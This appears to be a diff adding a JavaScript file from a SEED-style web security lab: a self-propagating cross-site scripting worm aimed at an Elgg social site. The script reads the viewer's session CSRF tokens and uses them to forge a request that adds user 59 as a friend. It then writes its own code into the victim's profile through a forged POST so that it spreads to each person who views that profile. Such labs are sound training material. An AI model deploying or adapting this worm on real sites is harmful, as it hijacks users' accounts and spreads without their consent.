@@ -1,0 +1,50 @@
+<script id="worm" type="text/javascript">
+ window.onload = function(){
+    var samyGuid=59;//FILLIN
+    var guid="&guid="+elgg.session.user.guid;
+    if(elgg.session.user.guid !=samyGuid){ //(1)
+
+        var Ajax=null;
+        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;  // (1)
+        var token="&__elgg_token="+elgg.security.token.__elgg_token; // (2)
+        //Construct the HTTP request to add Samy as a friend.
+        var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token;
+
+        //Create and send Ajax request to add friend
+        Ajax=new XMLHttpRequest();
+        Ajax.open("GET", sendurl, true);
+        Ajax.send();
+
+        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+        var jsCode = document.getElementById("worm").innerHTML;
+        var tailTag = "</" + "script>";
+        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); // (4)
+
+        var userName="&name="+elgg.session.user.name;
+
+
+        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+
+        var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+        var content=token+ts+"&accesslevel%5Bdescription%5D=2&briefdescription="+wormCode+"&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2"+guid;
+
+
+        var sendurl="http://www.seed-server.com/action/profile/edit";
+        var refer = "http://www.seed-server.com/profile/"+userName+"/edit";
+        
+        alert(jsCode);
+
+        Ajax=null;
+
+        Ajax=new XMLHttpRequest();
+
+        Ajax.open("POST", sendurl, true);
+
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.setRequestHeader("Referer", refer);
+
+        Ajax.send(content);
+    }
+ }
+ </script>
